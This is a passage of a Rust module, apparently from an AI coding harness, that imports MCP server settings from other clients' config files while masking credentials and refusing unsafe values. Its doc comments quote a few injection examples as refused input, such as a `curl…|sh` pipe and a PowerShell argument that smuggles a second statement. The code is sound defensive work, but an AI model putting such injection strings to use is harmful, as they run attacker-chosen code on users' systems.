//! Reading another client's MCP servers, for the first run to offer (since
//! step 25; `docs/architecture/08-configuration.md`, "Reading other tools'
//! set-up" and "First run").
//!
//! [`discover`](crate::discover) opens nothing. A file is read here only
//! when the person asks to see inside it: that is the import 08 says the
//! user asks for. What comes back holds **no literal value** of the file
//! beyond each server's command line or address:
//!
//! - **The environment's and the headers' values are dropped:** only their
//!   names are given. An imported server takes each from a variable the
//!   person sets: an environment variable by its own name, and a header
//!   from one named for the server and the header, never another's nor
//!   one of the harness's ([`HeaderVariables`]).
//! - **The command line and the address are given whole, as shown,** each
//!   argument through the secret filter's formats and the address's user
//!   part through 08's rule. A part that matches is replaced by
//!   [`MASK`](cineris_base::redact::MASK) before it leaves this module, and
//!   the server is [`Refusal::HoldsCredential`]: it cannot be imported, as
//!   step 17 refuses an entry that holds one.
//!   An argument that is an address with no scheme whose user part holds a
//!   password (`--proxy me:password@proxy.example.com:8080`) has that part
//!   masked and refuses too, read strictly so that `git@github.com:o/r`
//!   and an email address are left alone (`without_bare_users`; since the
//!   step 25 fixes, the review).
//! - **A name, a command or an address with a control character or a
//!   character that acts unseen** is [`Refusal::Unseen`], and is not
//!   imported either; nor is a name that cannot be a setting's
//!   ([`Refusal::Name`]: empty, or longer than [`MAX_NAME`]); nor a server
//!   with an argument that is not text, or arguments that are not a list
//!   ([`Refusal::NotUnderstood`], the argument masked whole, never shown as
//!   its JSON: since the step 25 fixes).
//! - **What the first run showed `[redacted]` is `[redacted]` in every view
//!   of the configuration,** by this module's own rule (`shown_args`,
//!   `shown_address`), though it is imported as it is (since the step 25
//!   fixes, the owner's choice).
//!
//! **What is shown masks more than what refuses** (since the full review
//! of step 25's third pull request, [`ImportedServer::shown`]): a value
//! whose name says it is a credential is shown
//! [`MASK`](cineris_base::redact::MASK) in `NAME=value`, after such a flag
//! (`--api-key value`), and in an address's query (`?token=…`). Such a
//! server is still imported, as it is in its file: a name says nothing
//! certain of its value. [`ImportedServer::hidden`] says that what is shown
//! hides a part of what would be imported, so that the first run can say
//! so. **Every argument's bounds show:** one that is empty, or holds a
//! space or a `"`, is shown in double quotes, its `"` and `\` escaped.
//!
//! **Which names, and which values** (since the review of the fixes of the
//! third pull request, the maintainers' decision; the substring rule
//! before it hid `--author`'s value and a password command's whole line):
//!
//! - **A name says it is a credential's** when one of its words, split at
//!   `-`, `_`, `.` and where the case changes (`apiKey`), is or ends in one
//!   of [`SECRET_ENDINGS`] once its last digits are left off, or is one of
//!   [`SECRET_WORDS`]: `--api-key`, `GITHUB_TOKEN`, `PGPASSWORD`,
//!   `NGROK_AUTHTOKEN` and `API_KEY2` do; `--author`, `--keyboard`,
//!   `--tokenizer` and `PWD` do not. Since the step 25 fixes (the review)
//!   the list has `passphrase`, `credential`, `signature` (and their
//!   plurals) among the endings and `pass`, `pw`, `bearer`, `cookie`,
//!   `sig`, `session` and `oauth` among the whole words: `--passphrase`,
//!   `DB_PASS`, `?sig=…`, `X-Amz-Signature`. `pwd`, its last digits left
//!   off, is a credential's as the last of two words or more (`MYSQL_PWD2`),
//!   as a flag (`--pwd`), or as a field's name in an address (`?pwd=…`,
//!   since the step 25 fixes), never as a whole variable's name, the
//!   shell's working directory. A name of `NAME=value` that holds white
//!   space (`mcp --key=…` inside a script) is not a name, and shows its
//!   value.
//! - **Never one that ends in** [`SHOWN_ENDINGS`] (`command`, `cmd`, `hook`,
//!   `script`, `file`, `path`, since the maintainers' answers `url`,
//!   `uri`, `endpoint`, `dir` and `directory`, and since the short read of
//!   B `helper`, `exec`, `program` and `plugin`): its value says where a
//!   credential comes from, names a program that gives it, or names a
//!   place, not the credential, and is shown (`--password-command …`,
//!   `--auth-hook=…`, `--auth-url https://…`, `--secrets-dir …`,
//!   `--api-key-helper …`). Nor a switch turned off (`--no-auth`), which
//!   takes no value.
//! - **The value after a credential's flag is its value** even when it
//!   begins with `-`, and **a header given as an argument**
//!   (`--header "X-API-Key: …"`, `Authorization: Bearer …`, or a `NAME=`'s
//!   value) is masked by its header's name, a scheme such as `Bearer` kept
//!   in view (since the review of the step 25 fixes). A single letter's flag
//!   (`-k …`) names nothing, and its value is shown.
//! - **An address in an argument shows its host and path,** and what in it
//!   is a credential is masked as in a server's own address: its user part
//!   (as it is read, by 08's rule, which refuses the server) and a field of
//!   its query or its fragment, separated by `&`, or by `;` where a field
//!   follows it, whose name says it is a credential's (`?api_key=…`,
//!   `#access_token=…`), by the rules above; an address inside such a
//!   field's value has its own fields masked too (`?next=…?api_key=…`), to
//!   a depth of three, and one deeper is masked whole and refuses.
//! - **Only a token is masked and imported:** ASCII letters and digits and
//!   `-._~+=:@/`, and `%` only in a server's own address's query or
//!   fragment, where it is percent-encoding (`cmd /c` expands `%NAME%` in
//!   an argument, an address in one included). **`/` is a token's**, in an
//!   argument and in an address's field alike (the maintainers'
//!   settlement after the narrow check): a rooted path
//!   (`/etc/ssl/client.key`), a `~/` path and a base64 secret with a `/`
//!   (`/K7MDENG/bPxRfiCYzEXAMPLEKEY`) are masked and imported, which
//!   [`ImportedServer::hidden`] says, never drawn and never refused. `\`
//!   and every character a shell reads as more than a letter stay out.
//!   **Not a token, since the short read of B:** a value that holds `://`,
//!   so that an address is never hidden whole and where a server connects
//!   shows or refuses it (`--auth-server https://…`, `API_KEY=https://…`,
//!   `?auth=https://…`); a token under a name that is not plain, ASCII
//!   letters, digits, `-`, `_` and `.` alone (`--api-key;`, `--api-key&`,
//!   `$API_KEY=`, `?x;$api_key=`: the name is a script's text, and what it
//!   hides could be run); and, in an argument of `cmd` or `cmd.exe` (any
//!   case, any directory), a token that holds a `/`, which `cmd` reads as a
//!   switch wherever it is before its `/c` or `/k` (`/v:on` turns on its
//!   `!NAME!` expansion).
//! - **A relative path is a place, and is shown,** by its text alone: it
//!   begins with `./`, `../`, `.\` or `..\` and holds only a token's
//!   characters and `\` (`--key ./client.key`). A value in an address's
//!   query or fragment is never a place.
//! - **No value is asked of the disk.** Whether a value is a token, a
//!   place or neither is judged by its text alone: only the file itself is
//!   read. (A rooted path was a place for a while where it named a file
//!   that existed; asking could reach the network, through an automounted
//!   `/net/<host>`, an NFS mount or an SMB share, and hold the set-up's
//!   worker, so the maintainers settled that it goes.) Clippy holds it: the
//!   file-system calls it refuses are allowed only on the function that
//!   opens the file and on the tests, so that any other call here fails
//!   `cargo xtask check`.
//! - **Anything else under such a name** (white space, a shell's
//!   metacharacter, a `\` outside a relative path: `x;curl…|sh`,
//!   `C:\certs\k.pem`; and what is not a token by the rules above) is
//!   masked and its server refused ([`Refusal::NamedValue`]): it would be
//!   imported unseen, and such a credential belongs in a variable.
//!
//! The files read: `~/.claude.json`, Cursor's `~/.cursor/mcp.json` and
//! Claude Desktop's file (`mcpServers`, each server a `command` with
//! `args` and `env`, or a `url` with `headers`), and Codex's
//! `~/.codex/config.toml` (`[mcp_servers.<name>]` tables of the same
//! keys).

use std::io::Read as _;
use std::path::Path;

use cineris_base::SecretFilter;

/// The most bytes of another client's file read: `~/.claude.json` keeps
/// that client's history too, and grows.
pub const MAX_FILE: u64 = 16 * 1024 * 1024;

/// The most servers given from one file.
pub const MAX_SERVERS: usize = 64;

/// The most characters of a server's name that can be imported: the
/// name is a key of the user's file, and names the server's tools.
pub const MAX_NAME: usize = 64;

/// What a word of a name whose value is taken for a credential is, or ends
/// in, once its last digits are left off: `GITHUB_TOKEN=…`, `--api-key …`,
/// `PGPASSWORD=…`, `NGROK_AUTHTOKEN=…`, `API_KEY2=…`.
///
/// **One list,** with [`SECRET_WORDS`]: the import reads it, every view of
/// the configuration reads a server's arguments by it
/// (`shown_args`), and the guess that redacts a reserved section by its
/// keys' names reads it too (`schema::redact`; since the step 25 fixes, the
/// review: the guess counted `credential` and this list did not).
pub const SECRET_ENDINGS: &[&str] = &[
    "key",
    "keys",
    "token",
    "tokens",
    "secret",
    "secrets",
    "password",
    "passwords",
    "passwd",
    "passphrase",
    "passphrases",
    "credential",
    "credentials",
    "signature",
    "signatures",
];

/// The words of a name whose value is taken for a credential, matched
/// whole: `--auth …`, `?auth=…` (not `--author`), `DB_PASS=…`, `--pw …`,
/// `--bearer …`, `--cookie …`, `?sig=…` (an Azure SAS), `--session …`
/// (not `--passthrough`, `--signal` or `--sessions-dir`).
pub const SECRET_WORDS: &[&str] = &[
    "auth",
    "authorization",
    "oauth",
    "pass",
    "pw",
    "bearer",
    "cookie",
    "cookies",
    "sig",
    "session",
];

/// The last words of a name whose value is never masked: it says where a
/// credential comes from, names a program that gives it, or names a place,
/// not the credential (`--password-command`, `--auth-hook`, `--token-file`,
/// `--auth-url`, `--secrets-dir`, `--api-key-helper`, `--auth-exec`).
pub const SHOWN_ENDINGS: &[&str] = &[
    "command",
    "cmd",
    "hook",
    "script",
    "file",
    "path",
    "url",
    "dir",
    "uri",
    "endpoint",
    "directory",
    "helper",
    "exec",
    "program",
    "plugin",
];

/// The words of a name, in lower case: split at `-`, `_`, `.` and where the
/// case changes (`apiKey`, `APIKey`), each run of digits kept with the
/// letters before it.
fn words(name: &str) -> Vec<String> {
    let mut words = Vec::new();
    let mut word = String::new();
    let characters: Vec<char> = name.chars().collect();
    for (at, &character) in characters.iter().enumerate() {
        if matches!(character, '-' | '_' | '.') || !character.is_alphanumeric() {
            if !word.is_empty() {
                words.push(std::mem::take(&mut word));
            }
            continue;
        }
        let before = at.checked_sub(1).and_then(|at| characters.get(at));
        let after = characters.get(at + 1);
        // `aB`, and the `B` of `ABc`: a new word begins.
        let begins = character.is_uppercase()
            && before.is_some_and(|before| {
                before.is_lowercase()
                    || before.is_ascii_digit()
                    || (before.is_uppercase() && after.is_some_and(|after| after.is_lowercase()))
            });
        if begins && !word.is_empty() {
            words.push(std::mem::take(&mut word));
        }
        word.extend(character.to_lowercase());
    }
    if !word.is_empty() {
        words.push(word);
    }
    words
}

/// Whether `word`, in lower case, is a credential's: it is, or ends in,
/// one of [`SECRET_ENDINGS`] once its last digits are left off, or it is
/// one of [`SECRET_WORDS`].
fn a_credentials_word(word: &str) -> bool {
    let stem = word.trim_end_matches(|character: char| character.is_ascii_digit());
    SECRET_WORDS.contains(&word) || SECRET_ENDINGS.iter().any(|ending| stem.ends_with(ending))
}

/// The words of `name`, as the rules here split it ([`words`]): for the
/// guess that redacts a reserved section by its keys' names, which reads
/// the import's one list (`schema::redact`).
pub(crate) fn name_words(name: &str) -> Vec<String> {
    words(name)
}

/// Whether `name` says its value is a credential: it holds no white space,
/// a word of it is a credential's, its last is not one of
/// [`SHOWN_ENDINGS`], and it is not a switch turned off (`--no-auth`).
/// `in_address`: `name` is a field's of an address's query or fragment.
fn names_a_secret(name: &str, in_address: bool) -> bool {
    if name.chars().any(char::is_whitespace) {
        return false;
    }
    let words = words(name);
    let Some(last) = words.last() else {
        return false;
    };
    if SHOWN_ENDINGS.contains(&last.as_str()) || words.first().is_some_and(|first| first == "no") {
        return false;
    }
    // `MYSQL_PWD2`, `--pwd`: a password's, as the last of two words or more
    // or as a flag; `PWD` alone is the shell's working directory (the final
    // review and the narrow check). In an address's field it is a
    // password's alone too (`?pwd=…`): no shell's working directory is there
    // (the step 25 fixes, the review).
    let pwd = last.trim_end_matches(|character: char| character.is_ascii_digit()) == "pwd";
    (pwd && (in_address || words.len() > 1 || name.starts_with('-')))
        || words.iter().any(|word| a_credentials_word(word))
}

/// Whether `character` can be in a token: an ASCII letter or digit, or one
/// of `-._~+=:@/`, and `%` only `in_address` (a query's or a fragment's
/// value, where it is percent-encoding: `cmd /c` expands `%NAME%` in an
/// argument, the final review). Nothing a shell reads as more than a
/// letter: `/` is a path's separator and a base64 secret's character (the
/// maintainers' settlement after the narrow check), and `\` is not one.
fn token_character(character: char, in_address: bool) -> bool {
    character.is_ascii_alphanumeric()
        || matches!(
            character,
            '-' | '.' | '_' | '~' | '+' | '=' | ':' | '@' | '/'
        )
        || (in_address && character == '%')
}

/// Whether `value` is a token: one or more of [`token_character`]'s, and
/// no `://`: an address is never hidden whole, so that where a server
/// connects shows, or refuses it (the short read of B, M2).
fn token_shaped(value: &str, in_address: bool) -> bool {
    !value.is_empty()
        && !value.contains("://")
        && value
            .chars()
            .all(|character| token_character(character, in_address))
}

/// Whether a credential's `name` is plain: ASCII letters, digits, `-`, `_`
/// and `.` alone, leading dashes among them. One that is not (`--api-key;`,
/// `--api-key&`, `$API_KEY`) is a script's text, and a value hidden after
/// it could be run: `pwsh -Command tool "--api-key;" C:/x.exe` runs the
/// path as a second statement (the short read of B, M1).
fn plain_name(name: &str) -> bool {
    name.chars()
        .all(|character| character.is_ascii_alphanumeric() || matches!(character, '-' | '_' | '.'))
}

/// Whether `program` is Windows' `cmd`: its file name, after any
/// directory, is `cmd` or `cmd.exe` in any case. `cmd` reads a `/` in its
/// arguments as a switch wherever it is before its `/c` or `/k`, and
/// `/v:on` turns on its `!NAME!` expansion (the short read of B, L4).
fn runs_cmd(program: &str) -> bool {
    let file = program.rsplit(['/', '\\']).next().unwrap_or(program);
    file.eq_ignore_ascii_case("cmd") || file.eq_ignore_ascii_case("cmd.exe")
}

/// Whether `value` is a relative path, by its text alone: it begins with
/// `./`, `../`, `.\` or `..\` and holds only a token's characters and `\`.
/// A place, and shown (the maintainers' answers); nothing asks the disk.
fn relative_path(value: &str) -> bool {
    ["./", "../", ".\\", "..\\"]
        .iter()
        .any(|start| value.starts_with(start))
        && value
            .chars()
            .all(|character| token_character(character, false) || character == '\\')
}

/// How a value whose name says it is a credential is shown.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Masked {
    /// Nothing is masked.
    No,
    /// Masked, and imported as it is: a token.
    Token,
    /// Masked, and its server refused: it cannot be imported unseen.
    /// Neither one token nor a relative path; or a token under a name that
    /// is not plain, or with a `/` that `cmd` reads.
    Loose,
}

impl Masked {
    /// What an argument's `value` under a name that says it is a
    /// credential is, by its text alone: a relative path, a token, or
    /// neither. Nothing, the mask itself (masked already by the formats)
    /// and a relative path, a place, are shown as they are.
    fn of(value: &str) -> Self {
        if value.is_empty() || value == cineris_base::redact::MASK || relative_path(value) {
            Self::No
        } else if token_shaped(value, false) {
            Self::Token
        } else {
            Self::Loose
        }
    }

    /// What a value in an address's query or fragment under a name that
    /// says it is a credential is: a token, or not; never a place (the final
    /// review). `percent`: the address is a server's own, where `%` is
    /// percent-encoding, and not an argument's, which `cmd /c` expands (the
    /// narrow check).
    fn in_address(value: &str, percent: bool) -> Self {
        if value.is_empty() || value == cineris_base::redact::MASK {
            Self::No
        } else if token_shaped(value, percent) {
            Self::Token
        } else {
            Self::Loose
        }
    }

    /// `self` for `value` under the credential's `name`, read by `cmd` or
    /// not: a token is loose under a name that is not plain (M1), and where
    /// `cmd` reads it and it holds a `/`, which `cmd` would take for a
    /// switch (L4; the short read of B).
    fn under(self, name: &str, value: &str, cmd: bool) -> Self {
        if self == Self::Token && (!plain_name(name) || (cmd && value.contains('/'))) {
            Self::Loose
        } else {
            self
        }
    }

    /// The more of the two.
    fn and(self, other: Self) -> Self {
        match (self, other) {
            (Self::Loose, _) | (_, Self::Loose) => Self::Loose,
            (Self::Token, _) | (_, Self::Token) => Self::Token,
            _ => Self::No,
        }
    }
}

/// Whether `name` can be a server's name in the user's file: one to
/// [`MAX_NAME`] of the ASCII letters, digits, `_`, `-` and `.`, the rule the
/// loader holds a server's name to since step 30
/// ([`crate::mcp::server_name_ok`]), so that the first run never writes a
/// server the loader would not start.
#[must_use]
pub fn settable_name(name: &str) -> bool {
    crate::mcp::server_name_ok(name)
}

/// `part` as an argument is shown: in double quotes, its `"` and `\`
/// escaped, when it is empty or holds white space or a `"`, so that where
/// each argument begins and ends shows.
fn quoted(part: &str) -> String {
    if !part.is_empty() && !part.chars().any(|c| c.is_whitespace() || c == '"') {
        return part.to_owned();
    }
    let mut shown = String::with_capacity(part.len() + 2);
    shown.push('"');
    for character in part.chars() {
        if matches!(character, '"' | '\\') {
            shown.push('\\');
        }
        shown.push(character);
    }
    shown.push('"');
    shown
}

/// How deep an address inside a field's value is looked into: one deeper
/// is masked whole and refused, never drawn (the session's own read of the
/// narrow check's fixes: looking in once drew a second address's
/// `api_key`). A limit, so that an argument of addresses inside addresses
/// cannot run the reader's stack out.
const ADDRESS_DEPTH: usize = 3;

/// `url` with the value of each field of its query and its fragment whose
/// name says it is a credential masked, and what was. `percent`: `url` is a
/// server's own, where `%` is percent-encoding. `cmd`: `url` is an argument
/// of `cmd` ([`runs_cmd`]). `depth`: how many field values `url` is
/// inside, 0 for an address of its own.
fn masked_query(url: &str, percent: bool, cmd: bool, depth: usize) -> (String, Masked) {
    let (before, fragment) = match url.split_once('#') {
        Some((before, fragment)) => (before, Some(fragment)),
        None => (url, None),
    };
    let (base, query) = match before.split_once('?') {
        Some((base, query)) => (base, Some(query)),
        None => (before, None),
    };
    let mut hidden = Masked::No;
    let mut shown = base.to_owned();
    for (mark, part) in [('?', query), ('#', fragment)] {
        if let Some(part) = part {
            let (fields, masked) = masked_fields(part, percent, cmd, depth);
            hidden = hidden.and(masked);
            shown.push(mark);
            shown.push_str(&fields);
        }
    }
    (shown, hidden)
}

/// The fields of a query or a fragment, each whose name says it is a
/// credential's with its value masked, and what was (the final review:
/// `#access_token=…` and `;`-separated fields were shown). A field whose
/// value is itself an address (`?next=https://o/cb?api_key=…`) has that
/// address's fields masked too (the narrow check), to [`ADDRESS_DEPTH`];
/// one deeper is masked whole and refuses.
fn masked_fields(text: &str, percent: bool, cmd: bool, depth: usize) -> (String, Masked) {
    let mask = cineris_base::redact::MASK;
    let mut hidden = Masked::No;
    let mut shown = String::with_capacity(text.len());
    for (field, separator) in fields(text) {
        match field.split_once('=') {
            Some((name, value))
                if names_a_secret(name, true)
                    && Masked::in_address(value, percent) != Masked::No =>
            {
                hidden = hidden.and(Masked::in_address(value, percent).under(name, value, cmd));
                shown.push_str(name);
                shown.push('=');
                shown.push_str(mask);
            }
            Some((name, value)) if value.contains(['?', '#']) => {
                shown.push_str(name);
                shown.push('=');
                if depth < ADDRESS_DEPTH {
                    let (inner, masked) = masked_query(value, percent, cmd, depth + 1);
                    hidden = hidden.and(masked);
                    shown.push_str(&inner);
                } else {
                    // Deeper than is looked into: masked whole, and the
                    // server refused, never drawn.
                    hidden = hidden.and(Masked::Loose);
                    shown.push_str(mask);
                }
            }
            _ => shown.push_str(field),
        }
        shown.extend(separator);
    }
    (shown, hidden)
}

/// `text`'s fields, each with the separator after it: `&`, or `;` where a
/// field follows it (a `=` before the next separator). Any other `;` stays
/// in its value (`password=pa;ss`), which is then not a token, and refuses
/// (the narrow check: `pa` was masked and `;ss` drawn).
fn fields(text: &str) -> Vec<(&str, Option<char>)> {
    let mut found = Vec::new();
    let mut start = 0;
    for (at, character) in text.char_indices() {
        let splits = character == '&'
            || (character == ';' && {
                let after = &text[at + 1..];
                let next = after.find(['&', ';']).unwrap_or(after.len());
                after[..next].contains('=')
            });
        if splits {
            found.push((&text[start..at], Some(character)));
            start = at + 1;
        }
    }
    found.push((&text[start..], None));
    found
}

/// How a server is reached.
#[derive(Clone, PartialEq, Eq)]
pub enum Launch {
    /// A program started with arguments, spoken to over standard I/O.
    Command {
        /// The program.
        program: String,
        /// Its arguments, each masked where it matched.
        args: Vec<String>,
    },
    /// A server at a web address.
    Remote {
        /// The address, its user part masked.
        url: String,
    },
}

/// Why a server cannot be imported.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Refusal {
    /// Its command line or its address holds a credential, now masked.
    HoldsCredential,
    /// Its name, command or address holds a control character or one
    /// that acts unseen.
    Unseen,
    /// Its name cannot be a server's: empty, longer than [`MAX_NAME`], or
    /// holding a character besides the ASCII letters, digits, `_`, `-` and
    /// `.` (since step 30).
    Name,
    /// A value whose name says it is a credential cannot be imported
    /// unseen, and belongs in a variable (since the review of the fixes of
    /// step 25's third pull request; judged by its text alone, since the
    /// maintainers' settlement after the narrow check): it is neither one
    /// token nor a relative path (it holds white space, a shell's
    /// metacharacter, a `\` outside a relative path, as in
    /// `C:\certs\k.pem`, or an address's `://`); or it is a token under a
    /// name with a shell's character (`--api-key;`, `$API_KEY=`), or one
    /// with a `/` that `cmd` would read as a switch (the short read of B).
    /// An address inside a field's value deeper than is looked into is
    /// refused as one too.
    NamedValue,
    /// It is neither a command nor an address this version reads: neither
    /// is given, or an argument is not text, or the arguments are not a
    /// list (the last two since the step 25 fixes); or, since step 30, a
    /// variable's or a header's name cannot be one (it holds `=` or begins
    /// with a digit), or a variable it takes from the environment is a
    /// provider's key or one of the harness's own, which no server is
    /// given.
    NotUnderstood,
}

/// One server of another client's file, with every literal value of its
/// environment and headers dropped.
#[derive(Clone, PartialEq, Eq)]
pub struct ImportedServer {
    /// Its name in that file.
    pub name: String,
    /// How it is reached.
    pub launch: Launch,
    /// The names of the environment variables it is given.
    pub env: Vec<String>,
    /// The headers it sends, each by its name, with the variable its value
    /// is taken from once imported.
    pub headers: Vec<Header>,
    /// Why it cannot be imported, if it cannot.
    pub refused: Option<Refusal>,
}

/// As the first run shows it, never what it hides: the command line or
/// the address through [`ImportedServer::shown`]'s rule (since the step 25
/// fixes' review: the derived form printed a token under a credential's
/// name whole, and so did `write::Imports`' and `FirstRunChoices`').
impl std::fmt::Debug for ImportedServer {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("ImportedServer")
            .field("name", &self.name)
            .field("launch", &self.launch)
            .field("env", &self.env)
            .field("headers", &self.headers)
            .field("refused", &self.refused)
            .finish()
    }
}

/// As the first run shows it: each argument, or the address, masked by the
/// import's rule, never a value it hides.
impl std::fmt::Debug for Launch {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Command { program, args } => f
                .debug_struct("Command")
                .field("program", program)
                .field("args", &args_view(args, runs_cmd(program)).0)
                .finish(),
            Self::Remote { url } => f
                .debug_struct("Remote")
                .field("url", &masked_query(url, true, false, 0).0)
                .finish(),
        }
    }
}

/// A header a server sends, by its name, and the variable its value is
/// taken from once imported ([`HeaderVariables`]). Its value in the other
/// client's file is dropped as it is read.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Header {
    /// The header's name.
    pub name: String,
    /// The variable its value is taken from.
    pub variable: String,
}

/// The variable a header's value would be taken from by the server's name
/// and the header's alone: both in capitals, joined by `_`, each character
/// that cannot be in a variable's name made `_` (`TRACKER_AUTHORIZATION`).
/// [`HeaderVariables`] gives the variable that is written.
#[must_use]
pub fn derived_variable(server: &str, header: &str) -> String {
    format!("{server}_{header}")
        .chars()
        .map(|character| {
            if character.is_ascii_alphanumeric() {
                character.to_ascii_uppercase()
            } else {
                '_'
            }
        })
        .collect()
}

/// What a variable that a header is taken from may not be, and which it
/// is (since the step 25 fixes, the review): the name made from the
/// server's and the header's ([`derived_variable`]) can be another
/// server's (`my-tracker` and `my_tracker`, `MY.TRACKER`, two names whose
/// letters other than ASCII ones are made `_`), so that a token set for one
/// host would be sent to the other; and it can be a provider's key's
/// (`anthropic` and `api-key` make `ANTHROPIC_API_KEY`), or one of the
/// harness's own (`CINERIS_…`), so that the person's key would go to that
/// server's host.
///
/// - **Never one of the harness's:** a provider's key's variable (those of
///   [`cineris_base::child_env::KNOWN_KEYS`], and those the caller adds,
///   the configuration's providers'), or one that begins `CINERIS_`, in any
///   case. Such a name, and one that begins with a digit (which a shell
///   cannot set), is given `MCP_` in front: `MCP_ANTHROPIC_API_KEY`.
/// - **Never another's:** a name already given to a header of a server
///   named with it, or a name any of those servers takes from the
///   environment as it is, in any case, gets `_2`, `_3`, … after it until it
///   is none: `MY_TRACKER_AUTHORIZATION_2`.
///
/// A name that is set in the environment already is given all the same;
/// the first run says so on the server's row, and that its value would be
/// sent to the server's host (`cineris-cli`'s first run).
#[derive(Debug, Clone, Default)]
pub struct HeaderVariables {
    /// The providers' keys' variables beside [`KNOWN_KEYS`], in capitals.
    ///
    /// [`KNOWN_KEYS`]: cineris_base::child_env::KNOWN_KEYS
    keys: std::collections::BTreeSet<String>,
    /// The names given or taken, in capitals.
    taken: std::collections::BTreeSet<String>,
}

impl HeaderVariables {
    /// Names for headers that are none of `keys`, the variables of the
    /// providers' keys the configuration knows (beside
    /// [`KNOWN_KEYS`](cineris_base::child_env::KNOWN_KEYS), which are never
    /// given whatever the caller says).
    #[must_use]
    pub fn new<I, S>(keys: I) -> Self
    where
        I: IntoIterator<Item = S>,
        S: AsRef<str>,
    {
        Self {
            keys: keys
                .into_iter()
                .map(|key| key.as_ref().to_ascii_uppercase())
                .collect(),
            taken: std::collections::BTreeSet::new(),
        }
    }

    /// Marks `servers`' names as taken: each header's variable, and each
    /// name it takes from the environment. For the servers of another file
    /// read already, whose rows were drawn.
    pub fn take(&mut self, servers: &[ImportedServer]) {
        for server in servers {
            for name in server
                .env
                .iter()
                .chain(server.headers.iter().map(|header| &header.variable))
            {
                self.taken.insert(name.to_ascii_uppercase());
            }
        }
    }

    /// Gives each header of `servers` its variable, from its name and its
    /// server's ([`derived_variable`]), by the rules above, in order; and
    /// marks them taken. Each name `servers` take from the environment is
    /// taken first, so that no header is given one.
    pub fn name(&mut self, servers: &mut [ImportedServer]) {
        for server in servers.iter() {
            for name in &server.env {
                self.taken.insert(name.to_ascii_uppercase());
            }
        }
        for server in servers.iter_mut() {
            let server_name = server.name.clone();
            for header in &mut server.headers {
                let variable = self.free(&derived_variable(&server_name, &header.name));
                self.taken.insert(variable.clone());
                header.variable = variable;
            }
        }
    }

    /// Settles the variables of `servers`, the servers picked from every
    /// file, together, at write time: a header keeps the variable its row
    /// showed unless another of them takes that name from the environment,
    /// another header kept it first, or it is one of the harness's, and is
    /// then given the next free name after it (`TRACKER_TOKEN_2`). Files
    /// are named apart as they are read, but a file read later can take
    /// from its environment a name an earlier file's header was given
    /// (since the step 25 fixes' review: `tracker`'s `Token` header and
    /// another file's `tracker-cli`, which takes `TRACKER_TOKEN`, shared it).
    pub fn settle(&mut self, servers: &mut [ImportedServer]) {
        for server in servers.iter() {
            for name in &server.env {
                self.taken.insert(name.to_ascii_uppercase());
            }
        }
        for server in servers.iter_mut() {
            for header in &mut server.headers {
                if self.the_harnesss(&header.variable)
                    || self.taken.contains(&header.variable.to_ascii_uppercase())
                {
                    header.variable = self.free(&header.variable);
                }
                self.taken.insert(header.variable.to_ascii_uppercase());
            }
        }
    }

    /// Whether `name` is one of the harness's: a provider's key's, or one
    /// that begins `CINERIS_`, in any case.
    fn the_harnesss(&self, name: &str) -> bool {
        harnesss_variable(name) || self.keys.contains(&name.to_ascii_uppercase())
    }

    /// The first name from `derived` that is none of the harness's and not
    /// taken.
    fn free(&self, derived: &str) -> String {
        let base =
            if self.the_harnesss(derived) || derived.starts_with(|c: char| c.is_ascii_digit()) {
                format!("MCP_{derived}")
            } else {
                derived.to_owned()
            };
        let mut name = base.clone();
        let mut number = 2_u32;
        while self.the_harnesss(&name) || self.taken.contains(&name.to_ascii_uppercase()) {
            name = format!("{base}_{number}");
            number += 1;
        }
        name
    }
}

/// Whether a server's variables and headers can be given as the loader
/// gives them (since step 30, `crate::mcp::server_problem`): each name one,
/// and no variable it takes from the environment by its own name a
/// provider's key, one of the harness's own, or one that tells the system's
/// loader what to run (`crate::mcp::loads_code`).
fn givable(server: &ImportedServer) -> bool {
    let named = server
        .env
        .iter()
        .chain(server.headers.iter().map(|header| &header.name))
        .all(|name| crate::mcp::bad_variable_name(name).is_none());
    named
        && !server
            .env
            .iter()
            .any(|name| harnesss_variable(name) || crate::mcp::loads_code(name))
}

/// Whether `name` is a variable the harness reads, whatever the
/// configuration says: a provider's key's of
/// [`KNOWN_KEYS`](cineris_base::child_env::KNOWN_KEYS), or one that begins
/// `CINERIS_`, in any case. A header is never given one, and the first
/// run's writer refuses a file that gives one ([`HeaderVariables`]).
#[must_use]
pub fn harnesss_variable(name: &str) -> bool {
    let name = name.to_ascii_uppercase();
    name.starts_with("CINERIS_") || cineris_base::child_env::KNOWN_KEYS.contains(&name.as_str())
}

impl ImportedServer {
    /// The host, and its port, that the server's headers are sent to: its
    /// address's, after any user part. `None` for a server started as a
    /// command.
    #[must_use]
    pub fn host(&self) -> Option<String> {
        let Launch::Remote { url } = &self.launch else {
            return None;
        };
        let after = url
            .split_once("://")
            .map_or(url.as_str(), |(_, after)| after);
        let authority = after.split(['/', '?', '#']).next().unwrap_or(after);
        let host = authority
            .rsplit_once('@')
            .map_or(authority, |(_, host)| host);
        (!host.is_empty()).then(|| host.to_owned())
    }

    /// The command line or the address, as one text to show: each
    /// argument's bounds shown, and each value whose name says it is a
    /// credential masked (the [module documentation](self)).
    #[must_use]
    pub fn shown(&self) -> String {
        self.view().0
    }

    /// Whether [`shown`](Self::shown) masks a part that would be imported
    /// as it is in its file: what the person accepts is then not all on the
    /// screen, which the first run says.
    #[must_use]
    pub fn hidden(&self) -> bool {
        self.view().1 != Masked::No
    }

    fn view(&self) -> (String, Masked) {
        launch_view(&self.launch)
    }
}

/// `launch` as it is shown, and what of it is masked by a name.
fn launch_view(launch: &Launch) -> (String, Masked) {
    match launch {
        Launch::Command { program, args } => {
            let (shown, hidden) = args_view(args, runs_cmd(program));
            let parts: Vec<String> = std::iter::once(quoted(program))
                .chain(shown.iter().map(|arg| quoted(arg)))
                .collect();
            (parts.join(" "), hidden)
        }
        Launch::Remote { url } => masked_query(url, true, false, 0),
    }
}

/// `args` each as it is shown, unquoted, and what of them is masked by a
/// name. `cmd`: they are `cmd`'s ([`runs_cmd`]).
fn args_view(args: &[String], cmd: bool) -> (Vec<String>, Masked) {
    let mask = cineris_base::redact::MASK;
    let mut hidden = Masked::No;
    let mut parts = Vec::with_capacity(args.len());
    // The value after a flag whose name says it is a credential, and the
    // argument before this one: that flag, when `after_flag`.
